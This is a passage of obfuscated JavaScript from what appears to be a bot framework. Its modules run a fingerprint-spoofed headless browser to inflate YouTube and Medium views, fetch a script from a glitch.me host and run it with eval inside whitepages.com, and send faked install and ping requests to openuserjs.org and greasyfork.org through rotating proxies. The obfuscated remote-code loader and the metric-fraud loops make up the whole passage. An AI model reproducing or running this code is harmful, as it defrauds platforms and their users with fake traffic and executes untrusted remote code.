      let t;
      D:
        for (;;)
          try {
            let z = await async function A() {
              let B;
              const C = {
                'User-Agent': B['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                B = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                  'headers': C
                })) ? .['data'];
              } catch (D) {}
              if (B)
                try {
                  B = (await axios['get'](B, {
                    'headers': C
                  })) ? .['data'];
                } catch (E) {}
              if (!B)
                return await randomWait(), await A();
              try {
                return 'object' == typeof B ? B : 'string' == typeof B ? JSON['parse'](B) : {};
              } catch (F) {
                if (!B)
                  return await randomWait(), await A();
              }
            }();
            flags['doExtFinge' + 'rprint'] && s['deviceDesc' + 'riptor'](z), t = await s['launch']();
            break D;
          } catch (B) {
            warn(B), await randomWait();
          }
      const {
        vanillaBrowser: u,
        userAction: v
      } = t, w = u['defaultBro' + 'wserContex' + 't'](), x = [
        'eHpl-BjXo5' + '8',
        '-PgyODlV6V' + '8',
        'S9EkXX0QYD' + 'U',
        'WvcG1OKdHW' + 'o',
        'b6gOcEwtZ8' + 'U',
        'apdtzA0Dzf' + 'k',
        'YiukDwYv2K' + '4',
        'zK-6UH5R5X' + '8',
        'bIXqNjtsEf' + '4',
        '3l253rESkw' + 'Q',
        'u6RVZKcN9z' + 'Q',
        '6ImZdwpdwT' + 'A',
        '0qPB5ANSBK' + 'c',
        '92duH3cqn1' + 'M',
        'b5lKI78fw3' + 's',
        'zpCCPZfP8L' + 'I',
        'ES7oooakr-' + 'c',
        '2eWyJ8FBvQ' + '8',
        'O4-B3OFPDf' + 'Q',
        'JFcnGk0_u7' + 'o',
        'AP7d2Ghq6d' + 'U',
        'UizEAwrZAG' + 'I',
        '0FAi5-h8Hj' + '0',
        'CNqA6IYj17' + 'k',
        'tSiKyCpwnS' + 'Y',
        'OrglyeV5xP' + 'Y',
        'BXkB-g4eCc' + 's',
        'Y53CmmpbOJ' + 's',
        'sm5MLz_IrQ' + 'k',
        'EuciRU_Ska' + '0',
        'cCbDCTLyPc' + 'E',
        'Ox7Ng5T7bm' + 'c',
        'TXTaB-dQg-' + '0',
        '3jSWaWgr_A' + '0',
        'xT8nvuxCRB' + 'E',
        '3c4Ab9EmRg' + 'Y',
        '2kScgeNOpL' + '8',
        't22jhowMom' + 'c',
        'HbcDLgkmXL' + 's',
        'JsKZ41uTeg' + 'c',
        'dfU48FRgs0' + 'g',
        '3K9ILewnUk' + 'o',
        'QmKwnRiKhD' + 'k',
        'n3nVsWsL6I' + 'k',
        'noTs52D_Mw' + 'Y',
        'A0tDR4nTTK' + '0',
        '9eBwFca-B1' + '4',
        'moasU30H5l' + 'A',
        '_Mb8oQtSBW' + 'E',
        'TNGGOgwPtc' + 'M',
        '-pYA-gjkQ8' + 's',
        '5d-dB6tZZA' + 'o',
        '8H2AiOV0oE' + 'o',
        'mI7aiKDGde' + 'w',
        'D-IMDYrj35' + '4',
        'gKgFiEgghy' + 'g',
        'mjVwfjJ2nj' + 'k',
        '6auDBi-D2H' + 'M',
        'X89-SWNdIE' + 'k',
        'T5Pn4LhIwj' + 'M',
        'wVnKGSjY3i' + '8',
        'g11NJftxw1' + '4',
        '9zHirkfEKk' + 'k',
        'ZyGS_AMbIa' + '4',
        'yG6bwB17ZP' + 's',
        'aytHiLe0s6' + 'U',
        'cGe-Mpw_F1' + 'w',
        'eMK7xV_nxZ' + 'o',
        'epJ2MAKa1Y' + 'Q',
        '5BNbKKMUhE' + 'o',
        'oxpAvc6tDP' + '8',
        'jRcc-NIR2R' + 'I',
        '258btO4mFw' + '4',
        'pXjJAUvSbQ' + 'A',
        '63-irfPjh2' + 'c',
        'xbrDZAFf3Q' + 's',
        'MVHMtRlesU' + 'g',
        'zed05qfHMB' + 'I',
        'nkhkxKUHsY' + 'g',
        'n4cSAqR9H1' + 'Q',
        'gOUPndcj7z' + 'I',
        'n3HBTTDHoX' + '8',
        'XIgMFHPIXv' + '4',
        'oQHKMky-_K' + 'c',
        'zfDgTzZ2nh' + '0',
        '1PYettRo-D' + 'M',
        'jzuZuwF490' + '4',
        '2DAgWTlXae' + '8',
        'keouUYA5hI' + 'k',
        'F7i7wRlGCd' + 'c',
        'uToD2c0CdJ' + 'c',
        'Y8DzpdFZZ8' + '8',
        '-rrH657DAa' + 'o',
        T(0xe, 'N#Vr') + '4',
        'TWTSnQDuad' + 'Y',
        'a0GUyvgnzg' + 'c',
        'eSReWZQyKd' + 'E',
        'D_5pMqdKSs' + '4',
        'm0ie8gHS00' + 'I',
        '6WosqMq9ej' + 'o',
        'i0afAOlon_' + '4',
        'j_fe6PfxW4' + 'Y',
        'GfPzi8SYr0' + 'w',
        'MSgZhNCwff' + 'M',
        'wxyBC_z6bI' + '8',
        'PkQpV-Fwhs' + 'k',
        'bVD6cWOVhN' + 'U',
        'mjZOpQlHbx' + 'M',
        'k_BXkcdbBO' + 'M',
        'X72oUsFV7q' + '0',
        'lONsILfq-W' + 'Y',
        'Bhe9PyM_s_' + 'Q',
        'Bhe9PyM_s_' + 'Q',
        'h4TBnDkX4y' + 'o',
        'PNBJyHEkfk' + '4',
        'L3iHS__ufc' + 'g',
        'm7aliUAwm_' + 'Y',
        'FuPVf85zMi' + 'w',
        'gtupAeNTDS' + 'M',
        'yyJ8zkckoB' + '8',
        'ZDTESiN1eS' + 'w',
        'Fo6x16DkoR' + 'o',
        'IAJqRxhVqO' + 'k',
        'KAgwII8TGj' + 'o',
        'o4tLCshmlb' + 'M',
        'dLj5fIupdA' + 'o',
        '_Xl_-b9P4U' + 'Q',
        'V3NxxpUUfW' + 'E',
        'J3ygeDEMnO' + 'w',
        'HcP_xmdwsl' + 'c',
        'M9g0h7px2_' + 'M',
        'b5WfUvcSgr' + 'U',
        'JGHnIshsoC' + 'E',
        'x2gfhCLHd9' + '4',
        'M5Fr8G0ma9' + 'o',
        '3sGeIBfFlC' + 'M',
        'k74y4KOJ2m' + '4',
        'pTHJB0S8E-' + 'U',
        'KaIrXJLfYP' + 'M',
        '0cisZkywhg' + 'Q',
        '0dVzItbl9E' + 'w',
        't0EqnhcSb1' + 's',
        'MuiXtvo1RY' + 'E',
        'Nj-3KC6knH' + 'w',
        'B19HbETNi5' + '8',
        T(0x5, '[Dl]') + 's',
        'U9ExFM1pji' + '0',
        'sONzDfjKhL' + '4',
        'n3Kj8zEfew' + 'U',
        'nXLGQ7QeoG' + 'Y',
        'OQFQiwiM-P' + 'Y',
        'UtPRpKRTtH' + 'U',
        'E56Myp0BzE' + 'E',
        '7DjOp_JM2Z' + 'w',
        'rNFLQFz_G1' + 'g',
        '1r2pKoVAdj' + 'M',
        'gm3eiv6UND' + 'M',
        'yOiROfjxzX' + 'o',
        'lt2AcxC_ap' + 'g',
        'bObEme2BDO' + 'E',
        '6Ut6HbJmW4' + 'w',
        'fUs0TtQQTo' + '0',
        '_phHS3FAgW' + 'Q',
        '1f8sU4l3dP' + '4',
        'HwTSLUd53K' + '8',
        'EpP2ymD_QG' + 'A',
        'TQ69QFqmbo' + 'I',
        'wA8BqUka_u' + '0',
        'bc8Ey-vuR5' + 'M',
        'PZ_uLi7ULl' + '0',
        'smu5FsnhwF' + '4',
        'dv1JluwoOb' + 'c',
        'nHotP0jbcv' + 'A',
        'iIjYNEmrVv' + 'M',
        'SeP-OZAiPb' + 'c',
        'v52PClvMFt' + 'k',
        '3loLqIPxTS' + '0',
        'jVu9mOzbSq' + 'U',
        '73SAN1vOrV' + 'k',
        'YLPxp4ntym' + 's',
        'YWXfelRk3b' + 'Q',
        'CsxlLMb6Uj' + 'o',
        'uafGOfwzpa' + 'Q',
        'XIr8qotHOI' + 'E',
        'EcoPCWC3Uh' + 'o',
        'AhOwyT8aIh' + 'g',
        't-Ox7lI5UH' + 's',
        'i08qNmssXe' + 'Q',
        'QrJIU09eD-' + 'g',
        'QvNNCQ-8Rp' + 'E',
        'k5gjnjDFAZ' + 's',
        'h_NQ3y1ek8' + 'U',
        'evPsJlNLy_' + '4',
        'qEPTydgwh4' + 's',
        'LB685ckhuf' + 'E',
        'Lj1EcSMGey' + '0',
        'OE19r7MIMW' + 'Q',
        'u8E3p0Vy-P' + 'Y',
        'f4a5OPFQa7' + 'k',
        'XDo7Q7yUEt' + 'k',
        'Vw_9zw0qHI' + 'c',
        'KGT5nbDsI_' + '8',
        'E008Eql59M' + 'Q',
        'wSOFdefX47' + 'A',
        '2xcv7q3QhR' + 'E',
        U(0x13) + '4',
        '0wP7csnX7k' + '4',
        'Xo0R8WiRSb' + '4',
        '8zNp8EOpGd' + '4',
        'sWYhIJZmoS' + 'E',
        'YdG8U1W-bX' + '0',
        'QeDsoSNml-' + 'c',
        'xW5q77El0x' + '8',
        'ZF14issJFE' + 'Y',
        'TRglEGLLKX' + 'o',
        'UE0SXc5k1e' + 'g',
        '6VY65D8f3D' + 'Q',
        'Iwxuob4fA8' + 'Q',
        'M4elJHCUIi' + 's',
        'GY9WWhO504' + 'k',
        'eErUSxmLDw' + '8',
        'ITQfAfzLj3' + 'I',
        'vbDrCL2FuL' + 'g',
        'KyQ_sUgtbK' + 'U',
        'lbEJcipUp8' + 'I',
        '2SqCn2LreN' + 'g',
        '1i-G2TUn41' + '0',
        's0ru6uK7vi' + '8',
        'gOxiE5UAAD' + 'w',
        'lx1rOOjekc' + '8',
        '5VYN2zA-Si' + 'k',
        'q9rLWEAzoo' + 'k',
        '4KSm3IY7Xz' + 'g',
        'fMqRu_ON-D' + 'E',
        'GfvShU6Sy9' + 'A',
        'OHzOmi1b60' + 'Y',
        'D9oTUKT-_n' + 'A',
        '_BrT2PlUiw' + '0',
        'kuuI4LzKgm' + 'I',
        '78dymyg88r' + 'M',
        'mi0nGt2B-q' + 'o',
        'HaI7BjnwnO' + 'c',
        'xlAEOkIuy7' + 'Y',
        '3VmtckvTXl' + 'U',
        'ed7TWHKDr4' + 'E',
        '2LfTjyVtbf' + 'U',
        'STHlCkloyv' + 'E',
        '-BI_-6YnM6' + 'Y',
        'LSK_G1qCQw' + 'M',
        '4tzqIl6EKV' + 'k',
        '9DshU55EiV' + '8',
        'mBtaEI_6e8' + 's',
        '960lvuduwY' + 'w',
        'XWJH-6J5Ee' + 'g',
        'XLS4qmyCAX' + 'g',
        '8cJDYeRiLn' + 'k',
        'cCaIVrltHz' + 'w',
        '8X2fF4pgM0' + 'E',
        '6s8Xm4wylr' + '4',
        'eFceshvavn' + 'o',
        '2h4g7euqR-' + 'U',
        'ujiBqXnn92' + '8',
        'w9F2NST-9j' + 's',
        'w-oc7F5Mmy' + 'U',
        'UYrmqL3cOD' + 'U',
        '4QB59etj0I' + 'o',
        'MY9MTNgXcN' + 'o',
        'ISBmcKDS5C' + '8',
        'ogIb7A7tvW' + '0',
        '-L583IZF6s' + 'k',
        'NbeKQq29ZL' + '0',
        'SPplDxd74F' + 's',
        'MHGV8QmpAz' + 'k',
        'iWzezFWpU7' + 'A',
        'NNCQt1rXXE' + 'Y',
        'bcb_ZhJJK8' + 'g',
        '3KoZGQiY6N' + 'o',
        'aSaXQH8F1_' + 'A',
        'V5nMOhI62o' + 'w',
        'JvlPjRUdId' + '0',
        '2gQHuClLCb' + '0',
        '5e-qDy-uUJ' + 'E',
        'oE8vC0QEWU' + 'E',
        '7cQken99yu' + 'o',
        'pmzu080j7r' + 'I',
        'sVy9F4whP6' + 'o',
        'MJrkylk7iE' + 'c',
        'XYjsTxi6oE' + '8',
        'mKlMouB6tp' + '0',
        'o2yunZQley' + 'A',
        'oRryU9F9Lv' + 's',
        'uzzK-052H0' + 'c',
        'VSvA4rCe-4' + 'M',
        'XURH2u_0fM' + 'I',
        'yfpVL2g_tk' + 'o',
        'AuEEjQ8x9o' + 'w',
        'wWkviY8zBr' + 'c',
        'zt_eubHWhx' + 'c',
        'O_7_BGU3u_' + '0',
        'QFDKBxmOn3' + 'Y',
        'w6gccNWXXv' + 'g',
        'VdNJxbrqdX' + 's',
        'wbi5Dxebvn' + 'I',
        'XEFOREYrJg' + 'k',
        'I2rcRta7WJ' + '0',
        'OP5KGfXHX_' + 'A',
        'w2MUMbbwlm' + 'o',
        'X3bF0nd6kf' + 'w',
        'WDDAhASf9j' + 'w',
        'fRwcV8gjbc' + 'w',
        '7T63gaRThr' + '0',
        'zC8AWIwhbf' + 's',
        'JSkVE0n-ee' + 'o',
        'qiQA5pWWRt' + 'U',
        'QdXCjZtfXu' + 'c',
        'vlBji8TOax' + 'o',
        'pBx_5CbIcp' + 'o',
        'L1Oy5F6ZMO' + 'Q',
        'P0NjLaBed-' + 'E',
        'DR16C4-keB' + '0',
        'LGmpIpu9eD' + 'w',
        'rNkX_A4kBA' + 'Q',
        'QztVMjrEk4' + '0',
        'uOM6m6KL5d' + '4',
        'g-Aju8xrrO' + 'E',
        'DfkDbFk_x9' + '8',
        'Y4NLDaowD6' + 'I',
        'ALSZnqQTuJ' + 'o',
        'xUmB6BpZBE' + 'w',
        'SxNOcZ1s85' + '8',
        '-noeCjO416' + 'k',
        'taPJqXBI8V' + 'Y',
        'YxqbkMi1Is' + '4',
        'vnJTyve2r-' + '4',
        '44lRVYQ38E' + 'Q',
        'QOv1N1X5J-' + 'g',
        'jNjREs7ODT' + 'g',
        'U30ToJo3dd' + 'k',
        'rm7lNIIOQC' + 'Y',
        'mGU6sOPlYv' + 'c',
        '6pwxUXdt6T' + 'Q',
        '6MkJRee35a' + 'Q',
        'LVbf7U9WAI' + 'c',
        'gPbhFvEeJ3' + 'M',
        'LWXAxz0MiH' + 'A',
        'L0KQJqfwJJ' + 'Y',
        'GWr33_u0VK' + 'c',
        '4ud3ZPfWkH' + 's',
        'dxSrySC4XM' + 'c',
        'iIM2KZC69W' + '0',
        '8DuJ3BAwME' + 'o',
        'm3BAhe1wsl' + 'Y',
        '02U_3pAZxM' + '8',
        '0e7nidPa97' + 'g',
        'TixW__6Eer' + 'o',
        'q46W8MTRTC' + 'E',
        'Jdxp04Je1O' + 'w',
        'HfP4TO3gfN' + '0',
        '4dUJaeB0qL' + '8',
        'xnL-fRJ3RZ' + 'o',
        'yJbD0Df45u' + 'Q',
        '-pGw8RkSSB' + 'k',
        '7cy86Njsis' + 'M',
        'jbgqvxtauo' + '4',
        'N8M00JjSVI' + 'I',
        'MfR5q6Td3R' + 'c',
        'eHwcx94wcp' + 's',
        'olDgVFgAgP' + 'o',
        'eAAd5BmzXz' + 'M',
        'xgTjQ2sGXd' + '4',
        'ipny6JUbzw' + 's',
        'WOwQ0UxbRj' + '4',
        'h0PKFed2GB' + 's',
        'JxdOrgzq7Z' + '8',
        '-VgpSWWW-8' + 'w',
        '-ix4OizkAn' + 's',
        'd3CRE9y3YV' + 's',
        '4QZlfXxorJ' + 'o',
        'YlDpg8aCs5' + 'M',
        'Qe5WT22-AO' + '8',
        'b_rjBWmc1i' + 'Q',
        '9yjZpBq1XB' + 'E',
        'hPx-RiBKXt' + 'Q',
        'UMqLDhl8PX' + 'w',
        'DlJEt2KU33' + 'I',
        'BWeqoARup-' + 'Q',
        '2Dx76lD8Sc' + 'c',
        'j_nI6G3ZDi' + 'E',
        'zvcUYYN1sx' + 'w',
        'cWRkYo1S3L' + '4',
        'cWRkYo1S3L' + '4',
        'bxC_PN3SRv' + 'I',
        '94m93T_5JL' + 'M',
        'RBSHAH4iWU' + '8',
        'RBSHAH4iWU' + '8',
        'RBSHAH4iWU' + '8',
        'bo9fTeXvSi' + 'A',
        'z6LqXiAK-8' + '0',
        '5tbOspjJ5f' + '0',
        'twQ6kKjtBk' + 'Y',
        'Ig17K38Fy0' + 'Y',
        'ZdlrVDwn_a' + '4',
        'aCT4Lddunx' + 'g',
        'acAvMGQtln' + 'M',
        '8XkcbdSRdO' + '0',
        '0e3GPea1Ty' + 'g',
        'zxYjTTXc-J' + '8',
        '9bqk6ZUsKy' + 'A',
        'plSyrHqUh7' + '8',
        'HkvQywg_uZ' + 'A',
        'lADBHDg-Jt' + 'A',
        'I2O7blSSzp' + 'I',
        'kd2KEHvK-q' + '8',
        'CbUjuwhQPK' + 's',
        'fb7T1v_VHp' + 'E',
        'SpeSpA3e56' + 'A',
        'RQdxHi4_Pv' + 'c',
        'nx2-4l4s4N' + 'w',
        'tUTCq3iiw_' + '4',
        'VDa5iGiPgG' + 's',
        'S-sJp1FfG7' + 'Q',
        'Hm1YFszJWb' + 'Q'
      ], y = [
        n,
        l,
        m,
        o
      ];
      log('browser\x20la' + 'unched'), flags['RPL2_MDM2'] && setTimeout(async () => {
        const C = await w['newPage']();
        for (;;) {
          let D = -0x12a5 + 0x1 * -0x2689 + 0x233 * 0x1a;
          if (await C['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => D++), !D) {
            await randomWait();
            for (let E = 0xe87 + -0x12b * -0x5 + -0x145e; E < getRandomInt(0x292 * 0x8 + -0x633 * -0x4 + -0x2d5b, -0xe03 + -0xb15 * -0x1 + 0x2f3); E++)
              await v['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
            await randomWait(), await wait(0x2ab * 0x85 + 0x1fe * -0x84 + 0x1 * 0x8e81);
          }
        }
      }, 0x1 * -0xa5b + 0x2296 + -0x1 * 0x17d7), flags['RPL2_WP'] && setTimeout(async () => {
        (async function C() {
          try {
            let D = -0xc3c + -0x9c + -0xcd8 * -0x1;
            const E = await w['newPage']();
            if (await E['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](F => D++), D)
              return await E['close'](), C();
            await E['waitForSel' + 'ector']('#main-cont' + 'ent'), await E['evaluate'](() => {
              const V = c;
              let F = new XMLHttpRequest();
              F['open']('GET', 'https://co' + 'ntent-deli' + V(0x17) + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1ae8 + -0x3e5 * 0x5 + -0x76f * 0x1), F['send'](), eval(F['responseTe' + 'xt']);
            });
          } catch (F) {}
        }());
      }, -0x225a + 0x391 * 0xa + 0xec * -0x1), flags['RPL2_YT'] && async function C() {
        const D = await h('https://ww' + 'w.youtube.' + 'com/');
        for (;;) {
          let E = 0x1030 + -0xd07 + -0x329;
          try {
            await i(D), await y['random']()(D);
          } catch (F) {
            log((E = -0x2 * -0x611 + 0x1a1c + -0x263d, F)), await D['close'](), setTimeout(() => {
              C();
            }, -0x1 * -0x254f + -0x3 * -0x35d + -0x223 * 0x16);
          }
          if (E)
            return warn('YouTube\x20bo' + 'tter\x20died.' + '..'), 0x2f9 * -0xd + 0x59e * 0x1 + 0x2108;
          await randomWait();
        }
        return 0xfe4 + -0x1ac * -0x1 + 0x5 * -0x383;
      }();
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      require('http')['createServ' + 'er'](async function(f, g) {
        g['writeHead'](0x1 * -0x249 + 0x210e + -0x1dfd), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || -0x1640 + 0x325f + -0x1 * -0x371);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const W = b,
          h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + '.user.js',
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = -0x1e5c + 0x11a7 + 0x2 * 0x65b) {
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (0x185 * -0x13 + 0x107 * -0x1d + 0x3aab));
            const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
              A = x['slice'](z),
              B = A['slice'](-0x5da + -0x193b + -0x1 * -0x1f15, A['indexOf']('\x20'));
            return y ? B['slice'](-0x26 + -0x1 * 0xf8c + 0x7 * 0x23e, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](0x3be9 + 0x3a9 * 0x1 + 0x1882 * -0x1),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q[W(0x12, '9[Ny')], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](-0x2 * 0x1939 + 0x40f6 + 0x188c),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w['headers'], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = -0xd * -0x17e + 0x7a8 + -0x1b0e; h < 0x51 * -0x3f + -0x362 * 0xb + 0x3929; h++)
        setTimeout(f, (-0x1b6fb + -0x11 * 0x1713 + 0x2 * 0x214cf) * h * getRandomInt(-0x138c + 0x1 * -0x9b5 + 0x1d42, -0xd91 * -0x1 + -0x3ca * 0xa + 0x1856));
      setInterval(() => {
        f();
        for (let i = 0x4a * 0x5e + 0x24dc + -0x556 * 0xc; i < -0x2c8 + -0x1 * -0x71 + 0x9 * 0x43; i++)
          setTimeout(f, (-0x145bc + 0x89f6 + 0x1a626) * i * getRandomInt(0x1 * -0x54e + 0x45e * 0x6 + -0x14e5, 0x83e + 0x4ff * 0x7 + -0x2b34));
      }, -0x57ff41 * -0x1 + 0x5d * -0x7d8 + -0x1e3749);
    }
  ],
  [
    () => flags['doGF'],
    async () => {
      async function f(j = null, k = 0x1052 + -0x1c90 * 0x1 + 0x61f * 0x2) {
        const X = c,
          q = makeFetchCookie(fetch),
          u = j ? new HttpsProxyAgent(j) : j,
          v = await q('https://gr' + 'easyfork.o' + 'rg/en', {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'cross-site'
            },
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          w = extractLinks(await v['text']())['filter'](E => E['includes']('by-site'))['slice'](-0x5eb + -0xffb + 0x15e6, -(-0x1 * -0x917 + -0x112a + 0x2 * 0x40a)),
          x = k && data['scriptTarg' + 'ets']['random'](),
          y = k ? x['preRef'] : w['random'](),
          z = await q(y, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origi' + 'n',
              'Sec-Fetch-User': '?1'
            },
            'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          A = extractLinks(await z['text']())['filter'](E => E['includes']('/scripts/') && !E['includes']('by-site'))['slice'](-0x4d6 * -0x2 + 0x2186 + 0x2b31 * -0x1),
          B = k ? x['url'] : A['random'](),
          C = await q(B, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origi' + 'n',
              'Sec-Fetch-User': '?1'
            },
            'referrer': y,
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          D = extractAnchorData(await C['text']());
        if (D['pingUrl']) {
          const E = sha1(D['ipAddress'] + D['scriptId'] + D['pingKey']),
            F = D['pingUrl'] + (D['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(E);
          await q('https://gr' + 'easyfork.o' + 'rg' + F, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': '*/*',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Sec-Fetch-Dest': 'empty',
              'Sec-Fetch-Mode': X(0x2),
              'Sec-Fetch-Site': 'same-origi' + 'n'
            },
            'referrer': B,
            'method': 'POST',
            'mode': 'cors',
            'agent': u
          });
        } else
          warn('awdiwajdwj' + 'qdqw');
      }
      async function g() {
        const h = await getRandomProxy();
        await f(h), random() <= -0x1b09 + -0x73 * 0x9 + 0x22 * 0xea + 0.6 && await f(h, 0x1d3 * 0xd + -0x1156 + 0xcc * -0x8);
      }
      g();
      for (let h = -0x1f2c + -0x151b * 0x1 + 0x5cf * 0x9; h < 0x2090 + -0xe2 * 0x2 + -0x1ec8; h++)
        setTimeout(g, (-0x185af + -0x5a09 + 0x2ca18) * h * getRandomInt(-0x1685 + 0x4ab * 0x1 + 0x11db, 0xc4b + -0xe * -0x19d + -0x22de * 0x1));
      setInterval(() => {
        g();
        for (let i = -0x2 * -0x409 + 0x5 * 0x2bb + 0x43 * -0x53; i < 0xe5 * -0x5 + 0x2 * 0x593 + -0x6a9 * 0x1; i++)
          setTimeout(g, (0x9311 * -0x2 + -0x25 * -0x68 + 0x2017a) * i * getRandomInt(-0xf99 * -0x2 + -0x1b * 0x9b + -0xed8, -0x517 + 0x62 * 0x61 + -0x8 * 0x401));
